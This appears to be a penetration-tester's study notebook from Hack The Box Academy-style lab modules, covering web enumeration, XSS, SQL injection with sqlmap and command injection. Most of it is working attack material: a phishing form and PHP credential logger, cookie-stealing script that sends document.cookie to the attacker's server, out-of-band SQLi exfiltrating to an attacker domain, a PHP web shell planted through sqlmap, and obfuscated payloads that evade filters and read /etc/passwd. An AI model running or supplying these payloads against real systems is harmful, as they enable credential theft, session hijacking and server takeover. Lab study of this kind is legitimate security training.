---
tags:
- training material
created: 2020-01-01
lastmod: 2020-01-01
published: 2020-01-01
image: 
description: 
---
## Enumeration

>[!code]- Fingerprinting
>###### Web application firewalls (WAFs) scanners
>```powershell
># wafw00f
>wafw00f inlanefreight.com
>```
>###### General scanners
>```powershell
># nikto
># -Tuning b, runs the Software Identification modules
>nikto -h inlanefreight.com -Tuning b
>
># whatweb
>whatweb http://inlanefreight.local
>```

>[!code]- Crawlers
>###### ReconSpider
>```python
>python ~/tools/reconSpider/reconspider.py http://inlanefreight.com
>```

>[!code]- Google Dorks
>Google Dorks examples on [exploit-db](https://www.exploit-db.com/google-hacking-database).
>
>![Pasted image 20250326062951](Images/Pasted%20image%2020250326062951.png)
>![Pasted image 20250326061851](Images/Pasted%20image%2020250326061851.png)
>![Pasted image 20250326061917](Images/Pasted%20image%2020250326061917.png)

>[!code]- Wayback Machine
>https://web.archive.org/

>[!code]- All purpose tools
>###### FinalRecon
>```powershell
>source ~/tools/FinalRecon/.virtualenv/3/env/bin/activate
>python firerecon.py --full http://inlanefreight.com
>```

>[!code]- Subdomain enumeration
>###### ffuf
>```powershell
>ffuf -ic -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://alert.htb/' -H 'Host: FUZZ.alert.htb'
>```

>[!code]- vHosts
>Add any found to `/etc/hosts`:
>```powershell
>10.10.10.10   dev.inlanefreight.htb
>```
## Miscellaneous 

>[!code]- Java obsfucation & deobsfucation tools
>Check that obsfucated code still runs - [jsconsole](https://jsconsole.com/)
>###### Obsfucation
>- Use a packer tool - [BeautifyTools](https://beautifytools.com/javascript-obfuscator.php).
>	- Doesn't always obsfucate print statements
>- Use an advanced obsfucator and base64 encode strings - [Obsfucator.io](https://obfuscator.io/).
>- Use [JSFuck](https://jsfuck.com/) or [jjencode](https://utf-8.jp/public/jjencode.html) or [aa encode](https://utf-8.jp/public/aaencode.html)
>	- Affects the performance of the code
>###### Deobsfucation
>- Use an unpacker - [UnPacker](https://matthewfl.com/unPacker.html)
>	- Won't always work for manually/custom obsfucated code

>[!code]- Hex encode & decode within Bash
>###### xxd
>```powershell
># Encode
>echo https://www.hackthebox.eu/ | xxd -p
>
># Decode
>echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r
>```

>[!code]- Send a cURL request
>```powershell
># GET
>curl -s http://SERVER_IP:PORT/
>
># POST
>curl -X POST -d "param1=sample" http://SERVER_IP:PORT/
>
># Hide progress (-s)
>curl -s http://SERVER_IP:PORT/
>```

>[!code]- Start a PHP server
>```php
>sudo php -S 0.0.0.0:80
>```

>[!code]- Sensitive files
>###### Apache
>```powershell
># Contains the web root
>/etc/apache2/sites-available/000-default.conf
>```
>###### General
>```powershell
># May contain password hashes
>/webroot/.htpasswd
>```
## Exploits
### Cross-Site Scripting (XSS)

>[!info]- Types of XSS vulnerabilities
>XSS is caused by malicious user input of javascript code which causes subsequent page loads to include that malicious javascript code. Eg, malicious input into a comment box.
>
>The malicious javascript code could cause a victims browser to send their session code to the attacker. It could also send an API request to have the victim's password reset to one of the attacker's choosing.
>
>1. **Persistent XSS (eg stored)** - When the XSS payload gets stored in the back-end database and retrieved upon visiting the page. It will be persistent for any user that visits the page.
>2. **Non-persistent XSS** - Are temporary and are not persistent through page refreshes. So, attacks only affect targeted users and will not affect other users who visit the page.
>	- *Reflected XSS* - When the XSS payload reaches the back-end server and gets returned without being sanitised.
>	- *DOM-based XSS* - Whilst Reflected XSS sends the payload to the back-end serer through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

>[!code]- Discover XSS vulnerabilities
>###### XXS Strike
>```powershell
># git clone https://github.com/s0md3v/XSStrike.git
># pip install -r requirements.txt
>
>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
>```
>###### Manually (code review)
>```powershell
># Some potentially vulnerable JS function
>document.write()
>DOM.innerHTML
>DOM.outerHTML
>
># Some potentially vulnerable jQuery functions
>add()
>after()
>append()
>```

>[!code]- XSS payloads
>###### Payloads to verify XSS existence
>```powershell
>Payload list: https://raw.githubusercontent.com/payloadbox/xss-payload-list/refs/heads/master/Intruder/xss-payload-list.txt
>```
>![Pasted image 20250329054259](Images/Pasted%20image%2020250329054259.png)
>![Pasted image 20250329061109](Images/Pasted%20image%2020250329061109.png)
>![Pasted image 20250329061125](Images/Pasted%20image%2020250329061125.png)
>
>###### Reflected XSS payloads
>Context for the payload
>
>![Pasted image 20250329064033](Images/Pasted%20image%2020250329064033.png)
>Steal a cookie
>
>![Pasted image 20250329063836](Images/Pasted%20image%2020250329063836.png)
>Keylogger
>
>![Pasted image 20250329063908](Images/Pasted%20image%2020250329063908.png)
>Fake login form (phishing)
>
>![Pasted image 20250329063942](Images/Pasted%20image%2020250329063942.png)
>Redirect to a malicious, identical-looking webpage
>
>![Pasted image 20250329065337](Images/Pasted%20image%2020250329065337.png)
>###### DOM XSS
>Context for the payload - a vulnerable HTML page has JS code which updates the content of a HTML with whatever is placed after the hash in the URL
>
>![Pasted image 20250329070428](Images/Pasted%20image%2020250329070428.png)
>An attacker can place a malicious payload after the hash, which would cause the (client-side) JS compiler to insert the payload within the pre-defined HTML tag. When the page is loaded, the JS payload is ran.
>
>![Pasted image 20250329070541](Images/Pasted%20image%2020250329070541.png)
>The payload could be more malicious - like cookie stealing, as seen in the Reflected XSS payloads section
>
>![Pasted image 20250329070626](Images/Pasted%20image%2020250329070626.png)
>For when `.innerHTML` is the vulnerable function - don't use `<script>` as it won't accept it. Instead use:
>
>![Pasted image 20250329123416](Images/Pasted%20image%2020250329123416.png)
>
>###### Other
>
>![Pasted image 20250401055052](Images/Pasted%20image%2020250401055052.png)

>[!code]- Phishing
>###### Identify a working payload
>###### Create a payload which displays a malicious login form
>The form says to `Please login to continue`. Have the completed form send its information to a server we are listening on.
>```html
>\<h3>Please login to continue\</h3>
>\<form action=http://10.10.14.217>
>    \<input type="username" name="username" placeholder="Username">
>    \<input type="password" name="password" placeholder="Password">
>    \<input type="submit" name="submit" value="Login">
>\</form>
>```
>###### Identify the `id` of the pre-existing HTML
>If we know the `id` (eg 'urlform') of the HTML item to remove, we can remove it with:
>```javascript
>document.getElementById('urlform').remove()
>```
>###### Create a payload to inject the malicious form AND remove the pre-existing HTML
>```javascript
>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.217><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
>```
>###### Setup a web server to handle any incoming form completions
>```powershell
>mkdir /tmp/tmpserver
>cd /tmp/tmpserver
>nano index.php # at this step we wrote our index.php file
>sudo php -S 0.0.0.0:80
>```
>Index.php:
>```php
>\<?php
>if (isset($_GET['username']) && isset($_GET['password'])) {
>    $file = fopen("creds.txt", "a+");
>    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
>    header("Location: http://SERVER_IP/phishing/index.php");
>    fclose($file);
>    exit();
>}
>?>
>```

>[!code]- Blind XSS
>###### Introduction
>When the XSS vulnerability is on a page we cannot access and therefore cannot see whether or how the XSS vulnerability exists.
>
>###### The problem
>For example, a sign up form may submit the form answers to an admin on an admin page. That admin page (which can only be viewed by an admin user) may have an XSS vulnerability within it. The attacker won't, however, know what value in the form has an XSS vulnerability, nor what type of payload works for that vulnerability (if it does indeed exist).
>
>###### The solution
>For each field we inject javascript into (in the hope its vulnerable to XSS), we can change the requested script name to the name of the field we are injecting in.
>```javascript
>\<script src="http://OUR_IP/username">\</script>`
>```
>If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on. If we don't, then it could be because the **payload type is wrong**.
>
>Once each field has been tested for a given payload type, we can retry each field with a different payload type.
>
>```html
><!-- this goes inside the full-name field -->
>\<script src=http://OUR_IP/fullname>\</script>
>
><!-- this goes inside the username field -->
>\<script src=http://OUR_IP/username>\</script>
>
>...SNIP...
>
><!-- this goes inside the full-name field -->
>\<img src="" onerror=http://OUR_IP/fullname />
>
><!-- this goes inside the username field -->
>\<img src="" onerror=http://OUR_IP/username />
>```

>[!code]- Session hijacking
>###### Have the XSS vulnerability retrieve a malicious JS script
>```html
><!-- JS payload -->
>\<script src=http://OUR_IP/script.js>\</script>
>```
>###### Have the `script.js` file request an `index.php` file from our server, with a `c` parameter set to the victim's cookies
>```javascript
>new Image().src='http://OUR_IP/index.php?c='+document.cookie
>```
>###### The `index.php` file
>Processes the cookies received, in case multiple are received.
>```php
>// remove non-string backslashes
>\<?php
> if (isset($\_GET['c'])) {
>    $list = explode(";", $\_GET['c']);
>    foreach ($list as $key => $value) {
>        \$cookie = urldecode($value);
>        $file = fopen("cookies.txt", "a+");
>        fputs(\$file, "Victim IP: {\$\_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
>        fclose($file);
>    }
>}
>?>
>```
>###### Use the obtained session cookie to login as that user
>Add the cookie to the web browser (via `Storage` in Dev Tools).
>
>![Pasted image 20250401060619](Images/Pasted%20image%2020250401060619.png)
>
>Once the cookie has been added, refresh the page to load it with the added cookie.
>
>![Pasted image 20250401060652](Images/Pasted%20image%2020250401060652.png)

>[!code]- XSS prevention
>###### Validate user input
>Check that what the user inputs is in a format that that input field would expect (eg does it look like an email?). Do this on both the front end and back end.
>
>###### Sanitise user input
>Check that the user input does not include things like javascript code. Check on both the front-end and back-end. If so, escape the special characters that would allow the javascript code to execute.
>
>###### Never directly inject user input into HTML code
>Never use user input directly within certain HTML tags, like:
>```html
>JavaScript code <script></script>
>CSS Style Code <style></style>
>Tag/Attribute Fields <div name='INPUT'></div>
>HTML Comments <!-- -->
>```
>Be careful with these jQuery functions which can change raw text of HTML field:
>```javascript
>html()
>parseHTML()
>add()
>append()
>prepend()
>after()
>insertAfter()
>before()
>insertBefore()
>replaceAll()
>replaceWith()
>```
>... And these JavaScript functions:
>```javascript
>DOM.innerHTML
>DOM.outerHTML
>document.write()
>document.writeln()
>document.domain
>```
>
>###### Convert special chars to their HTML codes
>Done on the back-end. It would, for example, encode `<` into `&lt;`, so the browser will display that char, but it would not cause any injection possibilities.
>
>###### Have a Web Application Firewall (WAF)
>It can automatically detect any type of inject going through HTTP requests and auto-reject those requests.
### SQLi

>[!info]- Types of SQLi
>##### Boolean-based blind SQL injection
>>[!exploit]
>>The application doesn't return any visible data from the database, but it does respond differently based on a true or false answer to the injected SQL query.
>
>Eg, if the condition is true, the page might load normally. If the condition is false, the page might show an error, a blank page, or a different structure. Differences in _load times_ are considered **time-based** sql injection instead.
>
>Lets say a website has this vulnerable query:
>```sql
>SELECT * FROM users WHERE id = '$id';
>```
>And you control the `id` parameter via a URL like:
>```powershell
>https://example.com/profile.php?id=1
>```
>You could inject a condition:
>```sql
>?id=1 AND 1=1   --> True, page loads normally  
>?id=1 AND 1=2   --> False, page behaves differently
>```
>And use that to extract the first character of the current database user:
>```sql
>?id=1 AND SUBSTRING(USER(), 1, 1) = 'r'
>```
>If it returns the same page, then the first letter is 'r'. If not, then try 'a', 'b', 'c', ... until you find the right character.
>
>##### Error-based SQL injection
>>[!exploit]
>The application returns error messages which can be exploited to reveal information, like table names, column name, usernames, password hashes, version info.
>
>Eg, lets say the original query is:
>```sql
>SELECT * FROM users WHERE id = $id;
>```
>And the user supplies (via https://example.com/profile.php?id=1):
>```sql
>?id=1
>```
>Now an attacker tries (ignore backslashes):
>```sql
>?id=1' AND (SELECT 1 FROM (SELECT COUNT(\*), CONCAT((SELECT @@version), FLOOR(RAND(0)\*2)) AS x FROM information_schema.tables GROUP BY x) a)-- -
>```
>This intentionally causes a duplicate entry error due to the `GROUP BY` with `RAND()` - but the error message includes the output of `@@version`, which leaks the database version.
>
>##### UNION-based SQL injection
>>[!exploit]
>>The attacker can use the SQL `UNION` operator to combine the results of two or more SELECT queries - one legitimate and one injected - to retrieve data from other tables in the database.
>
>The SQL `UNION` operator combines the results of two `SELECT` statements as long as: (1) both queries return the same number of columns, and (2) the columns have compatible data types. For example:
>```sql
>SELECT id, username FROM users
>UNION
>SELECT id, email FROM customers;
>```
>Let's say this is the vulnerable SQL syntax (via https://example.com/product.php?id=3):
>```sql
>SELECT name, price FROM products WHERE id = $id;
>```
>If an attacker can inject something like:
>```sql
>?id=3 UNION SELECT username, password FROM users-- -
>```
>Which turns the SQL query into:
>```sql
>SELECT name, price FROM products WHERE id = 3
>UNION
>SELECT username, password FROM users;
>```
>Now the page might display usernames and hashes instead of product info.
>###### Steps to perform UNION SQLi
>1. Confirm the injection point
>2. Find the number of columns
>```sql
>?id=3 ORDER BY 1--       (works)
>?id=3 ORDER BY 2--       (works)
>?id=3 ORDER BY 3--       (error → only 2 columns)
>```
>3. Inject your own SELECT with same number of columns and same data types (eg cannot inject a string into an integer column):
>```sql
>?id=-1 UNION SELECT username, password FROM users-- 
>```
>
>##### Stacked queries
>>[!exploit]
>>Multiple SQL statements are executed in one request by separating them with a semicolon (`;`). For example:
>>```sql
>>SELECT * FROM users WHERE id = 1; DROP TABLE users;
>>```
>
>Stacked SQLi is special because it allows attackers to go beyond reading data - they can modify the database: `INSERT` new rows, `UPDATE` records, `DELETE` tables, and `CREATE` new users
>
>##### Time-based blind SQL Injection
>>[!exploit]
>>The attacker can't see any direct output from the database, but can still extract data by making the database "wait" (or delay) for a certain amount of time based on a condition.
>
>Eg, this injection (via https://example.com/profile.php?id=1)
>```sql
>?id=1 AND IF(1=1, SLEEP(5), 0)-- 
>```
>Would cause the page to load slowly (5 seconds) if the injection works.
>
>And this:
>```sql
>?id=1 AND IF(SUBSTRING((SELECT user()), 1, 1) = 'r', SLEEP(5), 0)-- 
>```
>Would cause a 5 second delay if the first letter of the DB user is `'r'`. You can then repeat the process to extract the subsequent characters (using SUBSTRING):
>```sql
>?id=1 AND IF(SUBSTRING(USER(), 2, 1) = 'a', SLEEP(5), 0)-- 
>```
>
>##### Inline queries
>>[!exploit]
>>A SQL query embedded within the original query.
>These are uncommon because they require the vulnerable web app to be written in a certain way.
>
>For example (ignore backslash):
>```sql
>SELECT username, 
>       (SELECT COUNT(\*) FROM logins WHERE user_id = users.id) AS login_count
>FROM users;
>```
>
>##### Out-of-band SQL injection
>>[!exploit]
>>An attack can exfiltrate data through alternative channels, like DNS requests, HTTP requests and file writes.
>
>Typically used when all other techniques fail or are impractical (eg time-based). For example:
>```sql
>SELECT LOAD_FILE('\\\\attacker-server.com\\file');
>```
>If the server reaches out, it leaks the fact that the injection worked - and may included data (eg `@@version`) in the subdomain part of the requested path:
>```sql
>LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
>```
###### SQLMap

>[!code]- Setup
>```powershell
># Show basic or advanced help
>sqlmap -h
>sqlmap -hh
>
># Read the wiki
>https://github.com/sqlmapproject/sqlmap/wiki/Usage
>```

>[!code]- Generate a request
>1. Developer Tools > Network > right-click request > Save as cURL
>2. Burp > right-click request > Copy to file

>[!code]- Provide a HTTP request
>###### GET request
>```powershell
># GET request - generated from Save as cURL Firefox option
>sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
>
># POST request
>sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
>
># Only test the uid parameter
>sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
>sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
>
># Use a file (generated via Burp 'Copy to file' option)
>sqlmap -r req.txt
>```

>[!code]- Attack tuning
>##### Custom boundaries
>```powershell
>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
>```
>>[!info]- Explainer
>>Every SQLMap payload consists of:
>>1. A vector - which is the central part of the payload
>>2. The boundaries - which are the prefix and suffix formations that allow the vector to be properly injected into the victim application
>>
>>For example if the vulnerable code at the target is:
>>```php
>>$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $\_GET["q"] . "')) LIMIT 0,1";
>>\$result = mysqli_query($link, $query);
>>```
>>The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` and the suffix `-- -` will result in the following (**valid**) SQL statement at the targetL
>>```sql
>>SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
>>```
>>So the supplied prefix and suffix should be:
>>```powershell
>>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
>>```
>
>##### Level & risk
>- Higher level = more vectors and boundaries attempted (although less likely to work)
>- Higher risk = more vectors attempted (although more likely to cause fatal errors)
>  
>```powershell
># Default
>--level=1 --risk=1 # 72 payloads
>
># Most thorough
>--level=5 --risk=3 # 7,865 payloads
>```
>>[!warning]
>>Increasing the `RISK` may include `OR` payloads, which are inherently dangerous; they could delete or change existing database records, eg:
>>```sql
>>DELETE FROM users WHERE id='1' OR 1=1
>>```
>
>##### TRUE and FALSE filtering
>```powershell
># Status codes
>--code=200
>
># HTML title tag
>--titles
>
># Strings
>--string=success
>
># Base the comparison on the visible text, not the HTML tags
>--text-only
>```
>
>##### Technique characters (BEUSTQ)
>```powershell
>--technique=B # boolean-based blind
>--technique=E # error-based
>--technique=U # UNION query-based
>--technique=S # stacked
>--technique=T # time-based
>--technique=Q # inline
>--technique=BEU # multiple
>sqlmap -u "http://target.com/vuln.php?id=1" --dns-domain=attacker.com # out-of-band
>```
>
>##### UNION tuning
>```powershell
># There are 17 columns
>--union-cols=17
>
># Set 'a' as the filling value instead of default NULL and random integer
>--union-char='a'
>
># Add a 'FROM users' table syntax - required for Oracle databases
>--union-from=table # generic
>--union-from=users # example
>```

>[!code]- Database enumeration
>###### Basic information
>```powershell
>--banner       # database version banner
>--curent-user  # current user name
>--curent-db    # current database name
>--is-dba       # checking if the current user has administrator rights
>```
>
>###### Rows
>```powershell
>--tables  # list tables
>--columns  # list columns
>
>-D # specify database
>-T # specify table
>-C # specify column
>
>--dump # dump the specified columns
>--dump-all --exclude-sysdbs # dump all databases except any system databases
>
># Dump rows starting at the 2nd and ending at the 3rd
>--start=2
>--stop=3
>
># Dump rows based on a condition
>--where="name LIKE 'f%'"
>
># See how SQLMap options affect the SQL queries
>/usr/share/sqlmap/data/xml/queries.xml
>```
>###### Advanced enumeration
>```powershell
>--schema # see structure of all tables
>
>--search -T user # search tables called 'user' OR SIMILAR (eg username)
>--search -T pass # search tables called 'pass' OR SIMILAR (eg password)
>
>--passwords # auto-finds passwords
>
>--all --batch # enumerate everything possible from the DBMS - will require manually review in the output files
>```

>[!code]- Bypassing Web Application Protections
>###### Include CSRF tokens in requests
>>[!info]-
>>Specify which parameter supplies the CSRF token with `--csrf-token`. SQLMap automatically scans responses for when the token updates.
>```powershell
>sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
>```
>###### Parameters with required unique values
>>[!info]-
>>Web applications may require unique values to be provided inside particular parameters with each new request. The `--randomize=<parameter>` flag does this.
>```powershell
>sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp
>```
>###### Parameters with calculated values
>>[!info]-
>>One parameter may contain a calculated valued based upon another parameter, eg `h=MD5(id)`, where the `h` parameter contains the MD5 hash of the `id` parameter. The `--eval` flag accepts Python code to make this calculation.
>```powershell
>sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
>```
>###### IP address concealing
>```powershell
>--proxy="socks4://177.39.187.70:33283" # Proxy
>
># Proxy list (run through sequentially, in case the first doesn't work)
>--proxy-file
>
>--tor # use Tor network, needs setup beforehand (SOCKS proxy on port 9050 or 9150)
>--check-tor # SQLMap checks that Tor is properly setup
>```
>###### Skip WAF detection
>>[!info]-
>>SQLMap always first sends a test payload that contains a malicious-looking payload within a non-existent parameter to test whether a WAF exists. It looks for a difference in the response to determine whether a WAF exists.
>>
>>If a WAF is detected, SQLMap uses a third-party library `identYwaf` to detect the specific WAF.
>```powershell
>--skip-waf # skip checks for a WAF
>```
>###### Bypass user-agent blacklisting
>```powershell
>--random-agent # changes the default one to a random one from a large pool of values used by browsers
>```
>###### Tamper scripts
>>[!info]-
>>Python scripts that modify payloads just before they're sent to the target. Eg `between` replaces all occurences of `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #`. This helps to overcome primitive protection mechanisms on the server.
>```powershell
>--tamper=between # single script
>--tamper=between,randomcase # multiple scripts
>--list-tampers # available scripts
>```
>###### Chunked transfer encoding
>>[!info]-
>>Splits the POST request's body into 'chunks', which causes blacklisted SQL keywords to be split and sometimes go unnoticed
>```powershell
>--chunked
>```
>###### HTTP parameter pollution
>>[!info]-
>>Payloads are split in a similar way to `--chunked` (chunked transfer encoding), but this time across multiple parameters of the same name, eg `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`
>```powershell
>--hpp
># eg: ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
>```

>[!code]- OS exploitation
>###### File read/write
>```SQL
># Must have the required permissions
>LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
>```
>###### DBA privileges
>```powershell
># The Database Administrator has elevated permissions (helpful for OS exploitation)
>--is-dba
>```
>###### Read local files
>```powershell
>--file-read "/etc/passwd"
>
>cat ~/.sqlmap/output/www.example.com/files/\_etc\_passwd
>```
>###### Write to local files (to create a vulnerable web server)
>>[!info]-
>>Usually disabled. Eg the `--secure-file-priv` config must be manually disabled to enable the `INTO OUTFILE` command in MySQL.
>```powershell
># Prepare a basic PHP shell
>echo '<?php system($_GET["cmd"]); ?>' > shell.php
>
># Write the PHP shell on to the remote server
>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
>
># Access the remote PHP shell to execute a remote command
>curl http://www.example.com/shell.php?cmd=ls+-la
>```
>```
>###### OS commands
>--os-shell # attempts various techniques
>--os-shell --technique=E # uses error-based payloads only
>```

>[!code]- Miscelleaneous options
>###### General
>```powershell
># Use default options, skip any required user-input
>--batch
>
># Session cookie
>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
>sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
>
># Random user-agent header
>--random-agent
>
># Imitate a smartphone
>--mobile
>
># Change HTTP method
>--method PUT
>
>```
>###### Troubleshoot
>```powershell
># Display any DBMS errors
>--parse-errors
>
># Output traffic to a file (all sent and received HTTP requests)
>-t /tmp/traffic.txt
>
># Verbose (level)
>-v 3 # (or higher) displays the payloads used
>-v 6 # displays all errors and full HTTP requests to the terminal
>
># Proxy
>--proxy 127.0.0.1:8080
>```
### Command Injection

[PayloadsAllTheThings command injection reference](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

>[!code]- Command escape characters
>All of these operators (except the semi-colon for Windows command Line) can be used **regardless of the web application language, framework, or back-end server!**
>
>![[Images/Pasted image 20250505070004.png]]
###### Bypassing blacklisted characters

>[!code]- Space character
>###### Linux
>```powershell
>%09 # TAB
>
>${IFS} # a variable whose default value is a space and a tab
>
>{ls,-la} # Bash bracket expansion, which automatically adds spaces between arguments wrapped between braces
>```
>Others given in the [PayloadsAllTheThings guide](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space).

>[!code]- Using environment variables
>###### Linux
>Print all environment variables using `printenv`.
>```powershell
># Takes the first character of the PATH/PWD/HOME variable, which is often a forward slash
>
>${PATH:0:1} # Forward slash (/)
>${PWD:0:1} # Forward slash (/)
>${HOME:0:1} # Forward slash (/)
>
># Takes the 10th character from the LS_COLORS variable, which is often a semi-colon
>
>${LS_COLORS:10:1} # Semi-colon (;)
>```
>###### Windows
>Print all environment variables using `Get-ChildItem Env:`.
>```powershell
># %HOMEPATH% -> \Users\htb-student
># Output character at 6th starting position and ending at 11th from end
>
>%HOMEPATH:~6,-11% # Black slash (\) - DOS
>$env:HOMEPATH[0] # Black slash (\) - PowerShell
>```
>
>>[!exploit]- Example (Hack The Box Academy)
>>The vulnerable input:
>>
>>![[Images/Pasted image 20250506062234.png]]
>>
>>The payload:
>>```powershell
>>127.0.0.1%09%0a{ls,-la,${PATH:0:1}home}
>>```
>>
>>Which is interpreted as:
>>```powershell
>>127.0.0.1
>>	ls -la /home
>>```
>>Because `%09` is interpreted as a new-line character, which allows us to inject a new OS command, `%0a` is a space, which is necessary for the second command to be recognised, `{ls,-la}` is interpreted as `ls -la` which allows us to bypass the block on the space character, and `${PATH:0:1}` is interpreted as `/` because `/` is the first character of the victim's PATH variable.
>>
>>![[Images/Pasted image 20250506062129.png]]

>[!code]- ASCII shifting
>First, find the character in the ASCII table that is just before our desired character, then add it instead of `[` in the below example.
>
>![[Images/Pasted image 20250506054537.png]]
>###### Linux
>```powershell
>man ascii     # \ is on 92, before it is [ on 91
>$(tr '!-}' '"-~'<<<[) # this will give us \
>```
###### Bypassing blacklisted commands

>[!code]- Character insertions
>###### Quotes
>```powershell
># Cannot mix types of quotes and we must have an even number of them
>
>w'h'o'am'i -> whoami
>w"h"o"am"i -> whoami
>```
>
>>[!exploit]- Example (Hack The Box Academy)
>>```powershell
>>127.0.0.1%0aw'h'o'am'i
>>```
>>![[Images/Pasted image 20250506064521.png]]
>
>###### Linux only
>```powershell
># Bash will ignore certain characters, including `\` and `$@`
>
>who$@ami -> whoami
>w\ho\am\i -> whoami
>```
>>[!exploit]- Example (Hack The Box Academy)
>>The input field:
>>
>>![[Images/Pasted image 20250506182846.png]]
>>
>>Payload:
>>```powershell
>>127.0.0.1%0a%09{c$@at,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
>>```
>>Which gets interpreted as:
>>```
>>127.0.0.1
>>	cat /home/1nj3c70r/flag.txt
>>```
>>![[Images/Pasted image 20250506182737.png]]
>>Normally the `cat` command is blacklisted, so using it returns an `Invalid command` response. But, by obsfucating the `cat` command, the input is accepted and we can chain previous character bypasses to read a file on the victim (`flag.txt`).
>
>###### Windows only
>```powershell
># There are also some Windows-only characters which can be inserted in the middle of a command and do not affect the result, like the carat `^` character
>
>who^ami -> whoami
>```

>[!code]- Case manipulation
>###### Linux
>```powershell
># Linux commands are case sensitive, so we need to find a way of turning a mixed-case or upper-case command into its lower-case variant
>
>$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") # replace all upper case characters with lower case characters
>
>$(a="WhOaMi";printf %s "${a,,}") # same affect, and without a newline character at the end
>$
>```
>###### Windows
>```powershell
># Windows commands are case-insensitive, so it might work to change the case of some/all of the characters in the command
>
>WhOaMi
>```

>[!code]- Reversed commands
>###### Linux
>```powershell
>echo 'whoami' | rev # get the reversed string
>
>$(rev<<<'imaohw') # execute the reversed string
>```
>###### Windows
>```powershell
>"whoami"[-1..-20] -join '' # get the reversed string
>
>iex "$('imaohw'[-1..-20] -join '')" # execute the reversed string
>```

>[!code]- Encoded commands
>###### Linux
>```powershell
># encode the command
>echo -n 'cat /etc/passwd | grep 33' | base64
>
># decode the command
>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw=) # option 1
>bash -c "$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw=)" # option 2
>```
>
>###### Windows
>```powershell
># Encode the command
>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) # on Windows
>echo -n whoami | iconv -f utf-8 -t utf-16le | base64 # on Linux 
>
># Decode then execute the encoded command
>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
>```
>>[!exploit]- Example (Hack The Box Academy)
>>The vulnerable input:
>>
>>![[Images/Pasted image 20250507055758.png]]
>>
>>The malicious POST payload:
>>```powershell
>>ip=127.0.0.1%0a%09bash%09-c%09"$(base64%09-d%09<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)"
>>```
>>Which decodes to:
>>```powershell
>>ip=127.0.0.1
>>	bash -c "$(base64 -d <<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)"
>>```
>>
>>![[Images/Pasted image 20250507055858.png]]
>>
>>`ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=` is base64 encoded for `find /usr/share/ | grep root | grep mysql | tail -n 1`. This encoded string gets passed to the `base64 -d` command (`<<<`), and then the decoded string is executed by bash (`bash -c "$(...)"`). The injection is afforded via the `%0a` new-line character followed by the `%09` space character.

>[!code]- Alternative commands
>- base64 | openssl
>- bash | sh
###### Auto-evasion tools

>[!code]- Bashfuscator (Linux)
>###### Setup
>```powershell
>git clone https://github.com/Bashfuscator/Bashfuscator
>cd Bashfuscator
>pip3 install setuptools\==65
>python3 setup.py install --user
>
>cd ./bashfuscator/bin/
>```
>
>###### Use
>```powershell
>./bashfuscator -c 'cat /etc/passwd' # randomly pick an obsfucation technique (which could pick a technique that results in an output of over a million characters...)
>
># -s 1 (number of encoding stages)
># -t 1 (technique level - 1 is basic)
># --no-mangling (do not rename variables randomly / preserve readability)
># --layers 1 (apply 1 obsfucation layer)
>./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
>
